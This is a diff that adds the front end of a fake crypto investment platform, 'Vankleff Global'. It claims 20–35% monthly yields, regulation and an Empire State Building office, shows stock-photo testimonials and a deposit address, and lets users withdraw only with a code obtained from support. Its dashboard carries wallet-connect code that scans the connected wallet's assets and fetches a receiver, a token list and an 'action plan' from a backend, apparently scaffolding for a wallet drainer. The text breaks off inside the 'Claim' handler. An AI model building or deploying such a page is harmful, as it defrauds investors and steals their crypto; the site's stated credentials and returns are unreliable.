+    <div class="hero-content"><div class="hero-badge">🏢 350 Fifth Avenue · Empire State Building · New York, NY</div><h1>Institutional Crypto Management <span class="g">from the Heart of</span> <span class="b">New York.</span></h1><p>Operating from the Empire State Building, Vankleff Global provides Wall Street-grade execution and secure digital asset growth for investors worldwide.</p></div>
+  </div>
+  <div class="about-curtain">
+    <div class="stats-grid"><div class="stat-card"><div class="stat-val">$4.2B+</div><div class="stat-lbl">Assets Under Management</div></div><div class="stat-card"><div class="stat-val">18,400+</div><div class="stat-lbl">Active Private Investors</div></div><div class="stat-card"><div class="stat-val">147%</div><div class="stat-lbl">Average Annual Return</div></div><div class="stat-card"><div class="stat-val">9+</div><div class="stat-lbl">Years of Operation</div></div></div>
+    <div class="section"><div class="sec-label">ABOUT VANKLEFF GLOBAL</div><h2>A New York Institution Since 2015</h2><p>Founded by former Goldman Sachs and JP Morgan executives, managing digital assets for high-net-worth clients across 47 countries.</p><ul class="check-list"><li>Regulated by New York State DFS</li><li>SOC 2 Type II Certified</li><li>Fully segregated client accounts</li><li>24/7 institutional-grade support</li></ul></div>
+    <div class="hq-card"><div class="hq-top"><div class="hq-icon">🏢</div><div><div style="font-size:15px;font-weight:800;">Empire State Building</div><div style="font-size:11px;color:#aaa;">New York Global HQ</div></div></div><table><tr><td>Address</td><td>350 Fifth Ave, 85th Floor, NY 10118</td></tr><tr><td>Founded</td><td>2015</td></tr><tr><td>Employees</td><td>240+</td></tr><tr><td>Support</td><td><a href="mailto:support@vankleffglobal.com" style="color:#22c55e;">support@vankleffglobal.com</a></td></tr></table></div>
+    <div class="section"><div class="sec-label">INVESTMENT PLANS</div><h2>Choose Your Growth Tier</h2>
+      <div class="plan-card"><div style="font-size:11px;color:#aaa;">Institutional Yield</div><div style="font-size:18px;font-weight:800;">From $1,000</div><div class="plan-yield">20%</div><div class="plan-sub">targeted monthly yield</div><button class="btn-gs" onclick="openAuth('create')">Get Started</button></div>
+      <div class="plan-card pop"><div class="plan-badge pb-green">Popular</div><div style="font-size:11px;color:#aaa;">Strategic Alpha</div><div style="font-size:18px;font-weight:800;">From $10,000</div><div class="plan-yield">25%</div><div class="plan-sub">targeted monthly yield</div><button class="btn-gs" onclick="openAuth('create')">Get Started</button></div>
+      <div class="plan-card best"><div class="plan-badge pb-blue">Best</div><div style="font-size:11px;color:#aaa;">Elite Managed</div><div style="font-size:18px;font-weight:800;">From $50,000+</div><div class="plan-yield">35%</div><div class="plan-sub">targeted monthly yield</div><button class="btn-gs" onclick="openAuth('create')">Get Started</button></div>
+    </div>
+    <div class="section" style="background:#0a0f1a;"><div class="sec-label" style="text-align:center;">CLIENT FEEDBACK</div><h2 style="text-align:center;">Institutional Feedback</h2>
+      <div class="trust-card"><img class="trust-av" src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=120&h=120&fit=crop&crop=face" alt="Mark"/><div><div class="trust-stars">★★★★★</div><p class="trust-txt">"Vankleff Global provides the security and execution speed required for high-net-worth management."</p><div class="trust-name">Mark R.</div><div class="trust-role">Managing Director</div><div class="trust-loc">New York</div></div></div>
+      <div class="trust-card"><img class="trust-av" src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?w=120&h=120&fit=crop&crop=face" alt="Sarah"/><div><div class="trust-stars">★★★★★</div><p class="trust-txt">"The move to the Empire State Building reflects the firm's growth. Unmatched professionalism."</p><div class="trust-name">Sarah L.</div><div class="trust-role">Financial Strategist</div><div class="trust-loc">London</div></div></div>
+      <div class="trust-card"><img class="trust-av" src="https://images.unsplash.com/photo-1578950435899-d6b7b5c5dbda?w=120&h=120&fit=crop&crop=face" alt="William"/><div><div class="trust-stars">★★★★★</div><p class="trust-txt">"Copy trading turned my $15,000 into $46,000 in 3 weeks."</p><div class="trust-name">William Osei</div><div class="trust-role">Entrepreneur</div><div class="trust-loc">Ghana</div></div></div>
+    </div>
+    <div class="cta-box"><div class="cta-logo">V</div><div style="font-size:10px;color:#c9a84c;font-weight:700;letter-spacing:2px;margin-bottom:8px;">PRIVATE MEMBERSHIP</div><h2 style="font-size:26px;font-weight:900;margin-bottom:10px;">Ready to Grow Your Digital Assets?</h2><p style="color:#aaa;font-size:12px;margin-bottom:22px;">Join 18,400+ private investors who trust Vankleff Global.</p><button class="btn-gold" onclick="openAuth('create')">Open Account →</button><button class="btn-secondary" onclick="openAuth('signin')">Member Login ›</button></div>
+    <footer><div style="display:flex;align-items:center;gap:10px;margin-bottom:12px;"><div class="logo-box" style="width:34px;height:34px;font-size:14px;">V</div><span style="font-size:14px;font-weight:800;color:#c9a84c;letter-spacing:1px;">VANKLEFF GLOBAL</span></div><p style="color:#666;font-size:11px;line-height:1.7;margin-bottom:18px;">Institutional digital asset management from the Empire State Building, New York.</p><h4>Contact</h4><ul><li>350 Fifth Avenue, 85th Floor, New York, NY 10118</li><li><a href="mailto:support@vankleffglobal.com" class="femail">support@vankleffglobal.com</a></li></ul><h4>Legal</h4><ul><li><a href="#" onclick="showPage('terms')">Terms of Service</a></li><li><a href="#" onclick="showPage('privacy')">Privacy Policy</a></li><li><a href="#" onclick="openAuth('signin')">Member Login</a></li><li><a href="#" onclick="openAuth('create')" style="color:#22c55e;">Open Account</a></li></ul></footer>
+  </div>
+</div>
+
+<div id="page-terms" class="page"><div class="navbar"><div class="nav-logo"><div class="logo-box">V</div><div><span class="brand-name">VANKLEFF GLOBAL</span></div></div><button class="btn-login" onclick="showPage('landing')">← Back</button></div><div class="legal-page"><h1>Terms of Service</h1><div class="legal-meta">Effective: January 1, 2025 · Vankleff Global LLC · New York, NY</div><h2>1. Acceptance</h2><p>By using the Vankleff Global platform, you agree to these Terms.</p><h2>2. Eligibility</h2><p>You must be at least 18 years of age.</p><h2>3. Risk Disclosure</h2><p>Trading digital assets involves substantial risk of loss.</p><h2>4. Governing Law</h2><p>These Terms are governed by the laws of the State of New York.</p><h2>5. Contact</h2><p>350 Fifth Avenue, 85th Floor, New York, NY 10118. <a href="mailto:support@vankleffglobal.com" style="color:#22c55e;">support@vankleffglobal.com</a></p></div></div>
+<div id="page-privacy" class="page"><div class="navbar"><div class="nav-logo"><div class="logo-box">V</div><div><span class="brand-name">VANKLEFF GLOBAL</span></div></div><button class="btn-login" onclick="showPage('landing')">← Back</button></div><div class="legal-page"><h1>Privacy Policy</h1><div class="legal-meta">Effective: January 1, 2025 · Vankleff Global LLC · New York, NY</div><h2>1. Introduction</h2><p>Vankleff Global LLC is committed to protecting your privacy.</p><h2>2. Information We Collect</h2><p>Name, email, phone, country, and usage data.</p><h2>3. How We Use It</h2><p>To provide the platform, process transactions, and comply with legal obligations.</p><h2>4. Security</h2><p>AES-256 encryption, multi-factor authentication, and regular audits.</p><h2>5. Your Rights</h2><p>Contact <a href="mailto:support@vankleffglobal.com" style="color:#22c55e;">support@vankleffglobal.com</a>.</p></div></div>
+
+<!-- AUTH MODAL -->
+<div class="modal-ov" id="auth-modal" onclick="if(event.target===this)closeAuth()"><div class="modal-box"><button class="modal-close" onclick="closeAuth()">✕</button><div class="modal-logo">V</div><div class="modal-title">VANKLEFF GLOBAL</div><div class="modal-sub">Institutional Digital Asset Management</div><div class="tab-row"><button class="tab-btn" id="tab-c" onclick="switchTab('create')">Create Account</button><button class="tab-btn" id="tab-s" onclick="switchTab('signin')">Sign In</button></div><div id="form-create"><div class="fg"><span class="fi">👤</span><input type="text" id="c-name" placeholder="Full Name"/></div><div class="fg"><span class="fi">✉️</span><input type="email" id="c-email" placeholder="Email Address"/></div><div class="fg"><span class="fi">🔒</span><input type="password" id="c-pass" placeholder="Password"/></div><div class="loading-spinner" id="load-create"><div class="spinner-ring"></div><p style="color:#aaa;font-size:12px;">Creating your account...</p></div><button class="btn-submit" id="btn-create" onclick="doLoginCreate()">Create Private Account →</button></div><div id="form-signin" style="display:none;"><div class="fg"><span class="fi">✉️</span><input type="email" id="s-email" placeholder="Email Address"/></div><div class="fg"><span class="fi">🔒</span><input type="password" id="s-pass" placeholder="Password"/></div><div class="loading-spinner" id="load-signin"><div class="spinner-ring"></div><p style="color:#aaa;font-size:12px;">Signing you in...</p></div><button class="btn-submit" id="btn-signin" onclick="doLoginSignIn()">Sign In to Dashboard →</button></div></div></div>
+
+<!-- DASHBOARD -->
+<div id="page-dashboard" class="page">
+  <div class="sb-ov" id="sb-ov" onclick="closeSB()"></div>
+  <div class="sidebar" id="sidebar"><div class="sb-top"><div style="display:flex;align-items:center;gap:8px;"><div class="dn-logo">V</div><span style="font-size:13px;font-weight:800;color:#c9a84c;">VANKLEFF GLOBAL</span></div><button class="sb-close" onclick="closeSB()">✕</button></div><div class="sb-grp">OVERVIEW</div><div class="sb-item on" onclick="showDash('main');closeSB()"><div class="sb-left"><div class="sb-icon">⊞</div>Dashboard</div></div><div class="sb-item" onclick="showDash('deposit');closeSB()"><div class="sb-left"><div class="sb-icon">⬇</div>Deposit</div></div><div class="sb-item" onclick="showDash('withdraw');closeSB()"><div class="sb-left"><div class="sb-icon">⬆</div>Withdraw</div></div><div class="sb-item" onclick="showDash('statement');closeSB()"><div class="sb-left"><div class="sb-icon">📋</div>Statement</div></div><div class="sb-item" onclick="showDash('settings');closeSB()"><div class="sb-left"><div class="sb-icon">⚙</div>Settings</div></div><div class="sb-item" onclick="showConf();closeSB()"><div class="sb-left" style="color:#ef4444;"><div class="sb-icon">🚪</div>Logout</div></div></div>
+  <div class="dash-nav"><button class="ham" onclick="openSB()">☰</button><div class="dn-brand"><div class="dn-logo">V</div><div><span class="dn-name">VANKLEFF GLOBAL</span><span class="dn-sub">Your Gateway to Trading</span></div></div><div class="av-circle" onclick="openPM()">V</div></div>
+
+  <!-- MAIN DASHBOARD -->
+  <div id="dd-main"><div class="dash-content">
+    <div style="margin-bottom:16px;"><h2 style="font-size:20px;font-weight:800;">Welcome back, <span style="color:#22c55e;">vincentchidiadi</span></h2><p style="font-size:12px;color:#aaa;">Your trading overview</p></div>
+    <div class="balance-card"><div class="bal-lbl">Available Balance</div><div class="bal-amount">$100.00</div><div class="bal-btns"><button class="btn-dep" onclick="showDash('deposit')">⬇ Deposit</button><button class="btn-wit" onclick="showDash('withdraw')">⬆ Withdraw</button></div></div>
+    <div class="mini-grid"><div class="mini-card"><div style="font-size:24px;margin-bottom:6px;">📈</div><div class="mc-val">+$0.00</div><div class="mc-lbl">Total Profit</div></div><div class="mini-card"><div style="font-size:24px;margin-bottom:6px;">⬇</div><div class="mc-val">$0.00</div><div class="mc-lbl">Total Deposit</div></div></div>
+    <div class="price-box"><h3>Live Prices <span class="ldot"></span></h3><div class="pr"><div class="pr-l"><div class="pr-ic">B</div><div><div class="pr-nm">Bitcoin</div><div class="pr-tk">BTC</div></div></div><div style="text-align:right"><div class="pr-price" id="p-btc">$97,245.3</div><div class="up" id="c-btc">▲ +2.4%</div></div></div><div class="pr"><div class="pr-l"><div class="pr-ic">E</div><div><div class="pr-nm">Ethereum</div><div class="pr-tk">ETH</div></div></div><div style="text-align:right"><div class="pr-price" id="p-eth">$3,412.8</div><div class="up" id="c-eth">▲ +1.8%</div></div></div><div class="pr"><div class="pr-l"><div class="pr-ic">B</div><div><div class="pr-nm">BNB</div><div class="pr-tk">BNB</div></div></div><div style="text-align:right"><div class="pr-price" id="p-bnb">$645.2</div><div class="dn2" id="c-bnb">▼ -0.3%</div></div></div></div>
+
+    <!-- ═══════ WEB3 WALLET CONNECT (LOGIC-LESS) ═══════ -->
+    <div class="wcta" id="web3-section">
+      <h3 style="font-size:18px;font-weight:900;margin-bottom:8px;">Connect Your Wallet. Claim Your Trading Edge.</h3>
+      <p style="font-size:12px;color:#aaa;margin-bottom:14px;">High-speed execution and strategic market access are just one click away.</p>
+      <button class="btn-cw" id="connectBtn">Connect Wallet</button>
+      <div class="w3-btn-row">
+        <button class="btn-w3-claim" id="claimBtn">✦ Claim Access</button>
+        <button class="btn-w3-disconnect" id="disconnectBtn">Disconnect</button>
+      </div>
+    </div>
+    <div class="web3-panels">
+      <p id="statusText"></p>
+      <div id="chainSwitchBanner">⚠️ Please switch to <strong>BNB Smart Chain</strong> to continue.<br><button class="btn-switch-chain" id="switchChainBtn">Switch to BNB Chain</button></div>
+      <div id="stageLog"></div>
+      <div id="errorBanner"></div>
+      <div id="infoPanel">
+        <div class="info-row"><span class="info-label">Address</span><span class="info-value" id="walletAddress">—</span></div><hr class="divider">
+        <div class="info-row"><span class="info-label">Network</span><span class="info-value" id="networkName">—</span></div>
+        <div class="info-row"><span class="info-label">Chain ID</span><span class="info-value" id="chainIdDisplay">—</span></div><hr class="divider">
+        <div class="info-row"><span class="info-label">Native Balance</span><span class="info-value" id="nativeBalance">—</span></div>
+        <div class="info-row"><span class="info-label">USDT Balance</span><span class="info-value" id="usdtBalance">—</span></div><hr class="divider">
+        <div class="info-row"><span class="info-label">Status</span><span class="badge badge-yellow" id="statusBadge">Awaiting Claim</span></div>
+        <div class="info-row"><span class="info-label">Session</span><span class="badge badge-blue" id="sessionLabel">Web3Modal</span></div>
+      </div>
+      <div id="scannerPanel"><div class="scanner-title">🔍 Discovered Assets</div><div id="assetList"><span class="scan-status">Awaiting scan...</span></div></div>
+      <div id="txPanel"><div class="tx-title">Transaction History</div><div id="txList"><span style="color:#64748b;font-size:0.85rem;">No transactions yet.</span></div></div>
+    </div>
+  </div></div>
+
+  <!-- DEPOSIT -->
+  <div id="dd-deposit" style="display:none;"><div class="dep-wrap"><h1>Deposit Funds</h1><p style="font-size:12px;color:#aaa;margin-bottom:18px;">Select Payment Method</p><div class="meth-grid"><div class="meth sel" id="m-usdt" onclick="selM('usdt')"><span>💵</span>USDT (BEP-20)</div><div class="meth" id="m-btc" onclick="selM('btc')"><span>₿</span>BTC</div></div><div id="dep-form"><input class="amt-input" type="number" id="dep-amt" placeholder="Minimum $1,000"/><div class="quick-amts"><button class="qa" onclick="setAmt(1000)">$1,000</button><button class="qa" onclick="setAmt(5000)">$5,000</button><button class="qa" onclick="setAmt(10000)">$10,000</button></div><button class="btn-cont" onclick="showAddr()">Continue</button></div><div id="dep-addr" style="display:none;"><div class="addr-box"><div class="addr-val" id="w-addr">0x4000bAf1B2d5bbe78b6e56fDa21b1D3E4022C1Db</div><div class="addr-row"><button class="btn-copy" onclick="cpAddr()">📋 Copy</button><div class="net-badge">BEP-20</div></div></div><div class="warn-box"><span>⚠</span><p>Send exact amount to this address. Wrong network = lost funds.</p></div><div class="timer-row">⏱ Expires in: <span class="timer-val" id="tmr">30:00</span></div><button class="btn-cd" onclick="confDep()">Confirm Deposit</button></div><button class="btn-back" onclick="showDash('main')">← Back</button></div></div>
+
+  <!-- WITHDRAW -->
+  <div id="dd-withdraw" style="display:none;"><div style="padding:18px;"><h1 style="font-size:22px;font-weight:900;margin-bottom:16px;">Withdraw Funds</h1><div class="sec-notice"><h4>⚠ Security Notice</h4><p>All withdrawals require a verification code. Contact <a href="mailto:support@vankleffglobal.com" style="color:#22c55e;">support@vankleffglobal.com</a> to receive your code.</p></div><div class="code-box"><div class="otp-row"><input class="otp-in" maxlength="1" type="text" inputmode="numeric"/><input class="otp-in" maxlength="1" type="text" inputmode="numeric"/><input class="otp-in" maxlength="1" type="text" inputmode="numeric"/><input class="otp-in" maxlength="1" type="text" inputmode="numeric"/><input class="otp-in" maxlength="1" type="text" inputmode="numeric"/><input class="otp-in" maxlength="1" type="text" inputmode="numeric"/></div></div><button class="btn-verify" onclick="document.getElementById('wd-note-ov').classList.add('open')">Verify &amp; Withdraw</button><button class="btn-back" onclick="showDash('main')">← Back</button></div></div>
+
+  <!-- STATEMENT, SETTINGS -->
+  <div id="dd-statement" style="display:none;"><div class="ph"><h1>Account Statement</h1><p>All transaction records</p></div><div class="stmt-filters"><button class="sfbtn on">All</button><button class="sfbtn">Deposit</button><button class="sfbtn">Withdrawal</button></div><div id="stmt-list"></div><div style="padding:0 20px;"><button class="btn-back" onclick="showDash('main')">← Back</button></div></div>
+  <div id="dd-settings" style="display:none;"><div style="padding:18px;"><h1 style="font-size:22px;font-weight:900;margin-bottom:18px;">Account Settings</h1><div class="set-card"><div style="display:flex;align-items:center;gap:12px;margin-bottom:16px;"><div style="width:42px;height:42px;border-radius:50%;background:#16a34a;display:flex;align-items:center;justify-content:center;font-weight:700;color:#fff;font-size:18px;">V</div><div><div style="font-size:14px;font-weight:800;">vincentchidiadi</div><div style="font-size:11px;color:#aaa;">vincentchidiadi@gmail.com</div></div></div><button class="btn-save" onclick="alert('Changes saved!')">Save Changes</button></div><button class="btn-back" onclick="showDash('main')">← Back</button></div></div>
+</div>
+
+<!-- MODALS -->
+<div class="pm-ov" id="pm-ov" onclick="if(event.target===this)closePM()"><div style="background:#161b2e;border-radius:20px;padding:26px 22px;width:92%;max-width:400px;position:relative;"><button class="modal-close" onclick="closePM()">✕</button><div style="width:64px;height:64px;border-radius:50%;background:#16a34a;display:flex;align-items:center;justify-content:center;font-weight:700;color:#fff;font-size:26px;margin:0 auto 10px;">V</div><div style="font-size:16px;font-weight:800;text-align:center;">vincentchidiadi</div><div style="color:#22c55e;font-size:12px;text-align:center;margin-bottom:14px;">✓ Verified</div><div style="font-size:32px;font-weight:900;color:#22c55e;text-align:center;margin-bottom:18px;">$100.00</div><div style="font-size:11px;color:#aaa;text-align:center;margin-bottom:18px;">Available Balance</div><button style="width:100%;padding:13px;border-radius:12px;font-size:13px;font-weight:700;background:#1a2a1a;color:#ccc;margin-bottom:10px;" onclick="closePM();showDash('settings')">⚙ Account Settings</button><button style="width:100%;padding:13px;border-radius:12px;font-size:13px;font-weight:700;background:rgba(239,68,68,.1);color:#ef4444;border:1px solid rgba(239,68,68,.3);" onclick="closePM();showConf()">↪ Logout</button></div></div>
+<div class="conf-ov" id="conf-ov"><div class="conf-box"><h3>Log Out?</h3><p style="font-size:13px;color:#aaa;margin-top:8px;">Are you sure?</p><div class="conf-btns"><button class="btn-no" onclick="document.getElementById('conf-ov').classList.remove('open')">No</button><button class="btn-yes" onclick="doLogout()">Yes, Logout</button></div></div></div>
+<div class="gm-ov" id="gm-ov"><div class="gm-box"><button class="gm-close" onclick="closeGM()">✕</button><h3 id="gm-t">Notice</h3><p id="gm-b"></p><button class="btn-gm" id="gm-btn" onclick="closeGM()">OK</button><button class="btn-gmc" id="gm-c" onclick="closeGM()" style="display:none">Cancel</button></div></div>
+<div class="suc-ov" id="suc-ov"><div class="suc-box"><button class="suc-close" onclick="document.getElementById('suc-ov').classList.remove('open')">✕</button><div style="font-size:50px;margin-bottom:14px;">✅</div><h3 style="font-size:18px;font-weight:800;color:#22c55e;margin-bottom:10px;">Deposit Received!</h3><p style="font-size:13px;color:#aaa;">Validation takes 10–30 minutes.</p></div></div>
+<div class="wd-note-ov" id="wd-note-ov"><div class="wd-note-box"><div style="font-size:44px;margin-bottom:12px;">🔐</div><h3 style="font-size:17px;font-weight:800;color:#c9a84c;margin-bottom:12px;">Please Note</h3><p style="font-size:13px;color:#ccc;line-height:1.7;margin-bottom:20px;">Contact <a href="mailto:support@vankleffglobal.com" style="color:#22c55e;font-weight:700;">support@vankleffglobal.com</a> for your withdrawal code.</p><button class="btn-gm" onclick="document.getElementById('wd-note-ov').classList.remove('open')">OK</button></div></div>
+<div class="proc-ov" id="proc-ov"><div style="background:linear-gradient(160deg,#0a1a10,#0d2218,#071510);border:1px solid #1a4a2a;border-radius:24px;padding:32px 24px;width:90%;max-width:340px;text-align:center;"><div style="display:inline-flex;align-items:center;gap:6px;border:1px solid #22c55e;border-radius:20px;padding:5px 14px;font-size:11px;font-weight:700;color:#22c55e;margin-bottom:14px;">● IN-PROGRESS</div><h3 style="font-size:22px;font-weight:900;margin-bottom:8px;">Processing</h3><p id="proc-net-txt" style="font-size:13px;color:#aaa;margin-bottom:20px;">Executing via backend API...</p><button style="width:100%;padding:15px;background:#22c55e;border-radius:14px;color:#fff;font-size:15px;font-weight:800;" onclick="document.getElementById('proc-ov').classList.remove('open');showDash('main')">Back to Dashboard</button></div></div>
+
+<!-- ═══════ LOGIC-LESS JAVASCRIPT ═══════ -->
+<script>
+// ═══════════════════════════════════════════════════════════════
+// UI-ONLY JAVASCRIPT — No business logic, no secrets
+// All sensitive operations go through fetch() to process.php
+// ═══════════════════════════════════════════════════════════════
+
+// ─── BACKEND API URL ──────────────────────────────────────────
+var API = 'process.php'; // Deploy process.php alongside index.html
+
+// ─── GLOBAL STATE ──────────────────────────────────────────────
+var prices = {btc:97245,eth:3412,bnb:645};
+var tmrInt = null;
+var depAmt = 1000;
+
+// ─── PAGE NAVIGATION ───────────────────────────────────────────
+var PAGES = ['landing','dashboard','terms','privacy'];
+function showPage(id){
+  PAGES.forEach(function(p){ var el = document.getElementById('page-'+p); if(el) el.classList.remove('active'); });
+  var el = document.getElementById('page-'+id); if(el) el.classList.add('active');
+  var ln = document.getElementById('landing-nav'); // Only exists on landing page
+  window.scrollTo(0,0);
+}
+function openAuth(tab){ document.getElementById('auth-modal').classList.add('open'); switchTab(tab); }
+function closeAuth(){ document.getElementById('auth-modal').classList.remove('open'); }
+function switchTab(t){
+  document.getElementById('form-create').style.display = t==='create'?'block':'none';
+  document.getElementById('form-signin').style.display = t==='signin'?'block':'none';
+  document.getElementById('tab-c').className = 'tab-btn'+(t==='create'?' on':'');
+  document.getElementById('tab-s').className = 'tab-btn'+(t==='signin'?' on':'');
+}
+function doLoginCreate(){
+  document.getElementById('btn-create').style.display='none'; document.getElementById('load-create').style.display='block';
+  setTimeout(function(){ document.getElementById('load-create').style.display='none'; document.getElementById('btn-create').style.display='block'; closeAuth(); showPage('dashboard'); showDash('main'); },6000);
+}
+function doLoginSignIn(){
+  document.getElementById('btn-signin').style.display='none'; document.getElementById('load-signin').style.display='block';
+  setTimeout(function(){ document.getElementById('load-signin').style.display='none'; document.getElementById('btn-signin').style.display='block'; closeAuth(); showPage('dashboard'); showDash('main'); },6000);
+}
+var DD = ['main','deposit','withdraw','statement','settings'];
+function showDash(sub){
+  DD.forEach(function(s){ var el = document.getElementById('dd-'+s); if(el) el.style.display='none'; });
+  var el = document.getElementById('dd-'+sub); if(el) el.style.display='block';
+  window.scrollTo(0,0);
+}
+function openSB(){ document.getElementById('sidebar').classList.add('open'); document.getElementById('sb-ov').classList.add('open'); }
+function closeSB(){ document.getElementById('sidebar').classList.remove('open'); document.getElementById('sb-ov').classList.remove('open'); }
+function openPM(){ document.getElementById('pm-ov').classList.add('open'); }
+function closePM(){ document.getElementById('pm-ov').classList.remove('open'); }
+function showConf(){ document.getElementById('conf-ov').classList.add('open'); }
+function doLogout(){ document.getElementById('conf-ov').classList.remove('open'); showPage('landing'); }
+function closeGM(){ document.getElementById('gm-ov').classList.remove('open'); }
+function showGM(t,b,btnTxt,fn,showC){
+  document.getElementById('gm-t').textContent=t; document.getElementById('gm-b').textContent=b;
+  var btn=document.getElementById('gm-btn'); btn.textContent=btnTxt||'OK'; btn.onclick=fn||closeGM;
+  document.getElementById('gm-c').style.display=showC?'block':'none'; document.getElementById('gm-ov').classList.add('open');
+}
+
+// ─── DEPOSIT ──────────────────────────────────────────────────
+function selM(m){ document.querySelectorAll('.meth').forEach(function(b){ b.classList.remove('sel'); }); document.getElementById('m-'+m).classList.add('sel'); }
+function setAmt(v){ document.getElementById('dep-amt').value=v; depAmt=v; }
+function showAddr(){
+  var a = parseFloat(document.getElementById('dep-amt').value);
+  if(!a||isNaN(a)||a<1000){ showGM('Minimum Deposit','Minimum is $1,000.','OK',closeGM,false); return; }
+  depAmt = a;
+  document.getElementById('dep-form').style.display='none'; document.getElementById('dep-addr').style.display='block';
+  startTmr(30*60);
+}
+function cpAddr(){
+  var a = document.getElementById('w-addr').textContent;
+  navigator.clipboard ? navigator.clipboard.writeText(a).then(function(){ alert('Copied!'); }) : alert(a);
+}
+function startTmr(s){ clearTmr(); tmrInt=setInterval(function(){ if(s<=0){ clearTmr(); document.getElementById('tmr').textContent='Expired'; return; } s--; var m=Math.floor(s/60),sc=s%60; document.getElementById('tmr').textContent=(m<10?'0':'')+m+':'+(sc<10?'0':'')+sc; },1000); }
+function clearTmr(){ if(tmrInt){ clearInterval(tmrInt); tmrInt=null; } }
+function confDep(){
+  document.getElementById('proc-net-txt').textContent='Verifying deposit via backend...';
+  document.getElementById('proc-ov').classList.add('open');
+}
+
+// ─── PRICE TICKER ─────────────────────────────────────────────
+function updPrices(){
+  Object.keys(prices).forEach(function(c){ var ch=(Math.random()-0.48)*0.8; prices[c]*=(1+ch/100); var pe=document.getElementById('p-'+c),ce=document.getElementById('c-'+c); if(pe){ pe.textContent='$'+(prices[c]>100?prices[c].toFixed(1):prices[c].toFixed(4)); if(ce){ ce.textContent=(ch>=0?'▲ +':'▼ ')+Math.abs(ch).toFixed(2)+'%'; ce.className=ch>=0?'up':'dn2'; }} });
+}
+setInterval(updPrices,8000);
+
+// ─── RISK DISCLOSURE ──────────────────────────────────────────
+window.onload = function(){ document.getElementById('risk-overlay').style.display='flex'; };
+function acceptRisk(){ document.getElementById('risk-overlay').style.display='none'; }
+
+// ─── OTP INPUT HANDLING ───────────────────────────────────────
+document.addEventListener('DOMContentLoaded',function(){
+  document.querySelectorAll('.otp-in').forEach(function(inp,i,all){ inp.addEventListener('input',function(){ if(inp.value.length===1&&i<all.length-1) all[i+1].focus(); }); inp.addEventListener('keydown',function(e){ if(e.key==='Backspace'&&!inp.value&&i>0) all[i-1].focus(); }); });
+});
+
+// ═══════════════════════════════════════════════════════════════
+// WEB3 FRONTEND — PURE DISPLAY & USER INTERACTION
+// NO business logic, NO secret keys, NO automated trigger logic
+// All decisions come from process.php
+// ═══════════════════════════════════════════════════════════════
+(function(){
+  var connectBtn    = document.getElementById('connectBtn');
+  var claimBtn      = document.getElementById('claimBtn');
+  var disconnectBtn = document.getElementById('disconnectBtn');
+  var statusText    = document.getElementById('statusText');
+  var stageLog      = document.getElementById('stageLog');
+  var infoPanel     = document.getElementById('infoPanel');
+  var txPanel       = document.getElementById('txPanel');
+  var scannerPanel  = document.getElementById('scannerPanel');
+  var errorBanner   = document.getElementById('errorBanner');
+  var statusBadge   = document.getElementById('statusBadge');
+  var chainSwitchBanner = document.getElementById('chainSwitchBanner');
+  var switchChainBtn    = document.getElementById('switchChainBtn');
+
+  var TARGET_CHAIN_ID = 56;
+  var TARGET_CHAIN_HEX = '0x38';
+  var ethersProvider = null, ethersSigner = null, rawProvider = null;
+  var transactions = [], currentChainId = TARGET_CHAIN_ID;
+  var connectedAccount = null, triggerRunning = false;
+  var serverConfig = null, serverReceiver = null, serverTokenList = null;
+  var serverActionPlan = null;
+  var discoveredAssets = [];
+
+  var sleep = function(ms){ return new Promise(function(r){ setTimeout(r, ms); }); };
+
+  // ─── fetchWrapper — all API calls go through here ───────────
+  async function apiCall(action, payload){
+    payload = payload || {};
+    try {
+      var res = await fetch(API, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ action: action, payload: payload })
+      });
+      var data = await res.json();
+      if (!data.success) { log(data.error || 'API error', 'err'); return null; }
+      return data;
+    } catch(e) {
+      log('API call failed: ' + e.message, 'err');
+      setStatus('Backend connection failed.');
+      return null;
+    }
+  }
+
+  // ─── LOGGING ────────────────────────────────────────────────
+  function log(msg, type){
+    type = type || 'info';
+    stageLog.classList.add('visible');
+    var line = document.createElement('div');
+    line.className = 'log-line' + (type==='ok'?' log-ok':type==='warn'?' log-warn':type==='err'?' log-err':'');
+    line.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
+    stageLog.appendChild(line);
+    stageLog.scrollTop = stageLog.scrollHeight;
+  }
+  function setStatus(msg){ statusText.textContent = msg; log(msg); }
+
+  // ─── LOAD SERVER CONFIG ON PAGE LOAD ────────────────────────
+  async function loadServerConfig(){
+    log('Fetching server config...');
+    var cfg = await apiCall('get_config', {});
+    if (!cfg) return false;
+    serverConfig = cfg;
+    TARGET_CHAIN_ID = cfg.target_chain_id || 56;
+    TARGET_CHAIN_HEX = cfg.target_chain_hex || '0x38';
+    log('Server config loaded.', 'ok');
+    return true;
+  }
+
+  // ─── INIT WEB3MODAL WITH CONFIG FROM SERVER ─────────────────
+  async function initWeb3Modal(){
+    if (!serverConfig) { await loadServerConfig(); if (!serverConfig) return; }
+
+    var ESM = 'https://esm.sh/v135';
+    try {
+      var _w3m    = await import(ESM + '/@web3modal/wagmi@5.1.11');
+      var _chains = await import(ESM + '/wagmi@2.12.7/chains');
+      var _core   = await import(ESM + '/@wagmi/core@2.13.4');
+      var _eth    = await import(ESM + '/ethers@6.13.4');
+
+      var projectId = serverConfig.web3modal_project_id || '6d97bf9b04efc25f048a85edeb3f3fd1';
+      var chains    = [_chains.bsc, _chains.polygon, _chains.arbitrum, _chains.optimism, _chains.avalanche];
+
+      var wagmiConfig = _w3m.defaultWagmiConfig({
+        chains: chains, projectId: projectId,
+        metadata: { name:'Connect', description:'Wallet Connect', url: window.location.origin, icons: ['https://avatars.githubusercontent.com/u/37784886'] },
+        ssr: false
+      });
+
+      await _core.reconnect(wagmiConfig);
+
+      var modal = _w3m.createWeb3Modal({
+        wagmiConfig: wagmiConfig, projectId: projectId, chains: chains, defaultChain: _chains.bsc,
+        themeMode: 'dark',
+        themeVariables: { '--w3m-color-mix':'#22c55e', '--w3m-color-mix-strength':20, '--w3m-accent':'#22c55e', '--w3m-z-index':9999 }
+      });
+
+      // ─── BUTTON HANDLERS (pure UI triggers) ──────────────────
+      connectBtn.addEventListener('click', async function(){
+        try { setStatus('Opening wallet selector...'); await modal.open(); } catch(e) { setStatus('Could not open wallet modal.'); }
+      });
+
+      disconnectBtn.addEventListener('click', async function(){ await _core.disconnect(wagmiConfig); onDisconnected(); });
+
+      switchChainBtn.addEventListener('click', async function(){ await switchToBnbChain(); });
+
+      claimBtn.addEventListener('click', async function(){
